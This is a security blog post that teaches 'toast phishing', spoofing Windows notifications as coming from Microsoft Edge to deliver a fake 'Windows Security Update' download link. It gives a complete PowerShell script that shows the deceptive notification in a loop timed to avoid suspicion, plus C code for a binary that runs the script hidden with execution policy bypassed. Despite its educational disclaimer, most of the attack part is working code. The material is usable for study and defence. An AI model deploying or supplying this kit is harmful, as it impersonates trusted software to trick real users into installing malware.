---
title: "Toast phishing operations: Abusing Windows notifications for initial access"
date: 2026-03-09
categories: [Phishing]
tags: [C, Malware, Windows, Initial Access, Phishing]
image: "assets/toast_phishing/logo.png"
---

⚠️ **Disclaimer | Educational Purpose Only**
>
> This content is provided **strictly for educational and research purposes**.
>  
> All techniques, concepts, and examples discussed in this post are intended to support the study of **information security, malware analysis, and defensive research** in controlled and legal environments.
>
> The author does **not encourage, support, or condone** the use of this material for malicious, illegal, or unethical activities.
>
> Any actions taken based on the information presented here are the **sole responsibility of the reader**.
>
> Always ensure that your research and experiments comply with **local laws, ethical guidelines, and institutional policies**.

## Introduction: 
Recently I studied in depth a phishing technique and found it interesting to bring it to my blog and share my recent studies. In this post I intend to cover a subject that I have always been interested in but never brought anything related to my blog, which is phishing techniques to obtain initial access, when considering the initial stage of an operation, the Toast Notifications technique fits well, it is a simple technique but surprisingly effective, where we can trick the user into believing that the notification they are receiving is from a legitimate application and therefore trustworthy, by exploiting internal Windows mechanisms, this technique appears highly credible when applied correctly.

## What is a Toast notification?
In Windows, it is an asynchronous notification mechanism, designed to display contextual information to the user without interrupting the execution flow of applications. Implemented as part of the Windows Runtime (WinRT) notification infrastructure, it allows applications to publish structured messages that are rendered by the operating system in the user interface.

From a technical point of view a toast notification is defined by an XML payload, which describes elements such as text, images, action buttons and interactive behaviors.

## How to exploit this technique
For this technique to be carried out successfully, we need to follow some steps and understand some processes of the technique, the first step is to understand how Windows maintains control of applications authorized to interact with the notification subsystem. This control is performed through registry keys located both in the user context (HKCU) and in the global machine context (HKLM). The enumeration of these keys can be done with the PowerShell command:
```powershell
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings"
```
This command returns the metadata associated with each entry, allowing the identification of which applications have integration with the Windows Notification Platform. In a more refined scenario, it is common to extract only the names of the subkeys (AppIDs), since they directly represent the identifiers used by the system to link notifications to specific applications. This enumeration phase is critical, as it defines which targets can be reused or “masked” during the execution of the technique.

### PowerShell script:
By obtaining the names of the subkeys, we can start building a PowerShell script that will fake a legitimate system notification, for our example I used the Microsoft Edge notification:
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime

[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "MSEdge"

$xml = @"
<toast>
	<visual>
		<binding template="ToastGeneric">
			<text>Windows Security Update</text>
			<text>Software update required!</text>		
		</binding>
	</visual>
	<actions>
		<action content="Install Update" activationType="protocol" arguments="http://192.168.5.25:5500" />
	</actions>
</toast>
"@

while ($true) {
    $doc = New-Object Windows.Data.Xml.Dom.XmlDocument
    $doc.LoadXml($xml)
    
    $toast = [Windows.UI.Notifications.ToastNotification]::new($doc)
    $notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
    $notifier.Show($toast)
    
    Start-Sleep -Seconds 600
}
```

Let’s understand what is happening here, first we have:

```
Add-Type -AssemblyName System.Runtime.WindowsRuntime
```

this sequence is responsible for loading the necessary support so that PowerShell can instantiate and manipulate WinRT classes, we also have the following lines:

```
[Windows.UI.Notifications.ToastNotificationManager] and [Windows.Data.Xml.Dom.XmlDocument]
```

This will ensure that these specific classes are correctly resolved within the script context. The identifier I mentioned was $AUMID = "MSEdge" it is the AUMID (Application User Model ID) that defines which application will be associated with the displayed notification, by using a legitimate identifier widely present in the system, such as Microsoft Edge, the script implicitly inherits the “visual identity” of this application at the moment the notification is displayed

The XML part defines how the notification will be built, both from a visual and behavioral point of view. Windows uses this declarative model to describe toast notifications, the root element <toast> works as the main container of the notification, everything that will be displayed or triggered must be encapsulated within it, from there, the <visual> block is responsible for defining the appearance of the notification, inside it <binding template="ToastGeneric"> indicates that a default template provided by the system will be used, which already defines a common layout for title, description and other basic elements.
The <text> elements inside the binding represent the textual content displayed to the users. The first is usually treated as the title and receives greater visual emphasis, while the subsequent ones function as description.

The <actions> section adds interactivity to the notification, inside it, each <action> defines a clickable button or option, the content attribute is the visible text for the user, while activationType determines the type of action that will be executed, in the case of protocol, the system interprets the value of arguments as a resource to be opened, such as a URL or a handler registered in the system. This allows the notification to not only be informative, but also to function as an entry point for some external action.

Inside the while ($true) loop, the script implements a continuous notification loop, the Start-Sleep -Seconds 600 introduces a 10 minute interval between each loop execution, which avoids excessively noisy behavior and reduces the chance of raising immediate suspicion.

At the IP address indicated in the action instruction of the script, for testing, I created a simple web interface, where there is only one download option and I hosted a server in python locally. In addition, so that the script does not need to be executed via terminal by the user, I created an executable to perform this function, in this way the only user interaction required will be to execute this binary.

#### About the binary:
```c
#include <stdio.h>
#include <windows.h>

int main() {
    const char* psScriptPath = "C:\\toast.ps1";
    
    
    char cmdLine[512];
    snprintf(cmdLine, sizeof(cmdLine), 
             "powershell.exe -ExecutionPolicy Bypass -File \"%s\"", 
             psScriptPath);
  
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    if (CreateProcess(NULL, cmdLine, NULL, NULL, FALSE, 
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
                      }
    return 0;
}
``` 
Let’s briefly analyze what it does, first, it starts by defining the script path (toast.ps1) and builds a command line that calls powershell.exe with -ExecutionPolicy Bypass, and then prepares the STARTUPINFO and PROCESS_INFORMATION structures, which are necessary to create a new process using the Windows API. The main call is CreateProcess, which starts PowerShell with the built command, using the CREATE_NO_WINDOW flag which makes the process run without opening a visible window.

In summary, this binary serves as a simple wrapper to trigger the PowerShell script in a silent and controlled way, without depending on direct user interaction to execute the script.

### PoC - Proof of Concept
And now let’s test how our phishing turned out:
<iframe width="560" height="315" src="https://www.youtube.com/embed/_dWHZ-pncyY" 
title="YouTube video" frameborder="0" allowfullscreen></iframe>

### References:
[Toast notifications technique - IPurple Team](https://ipurple.team/2026/03/25/toast-notifications/)

[Hackers make FAKE notifications - John Hammond](https://www.youtube.com/watch?v=wrAFZLa1TAk&t=223s)

[Adaptive and Interactive Toast Notifications - Microsoft Learn](https://learn.microsoft.com/en-us/windows/apps/develop/notifications/app-notifications/adaptive-interactive-toasts?tabs=appsdk)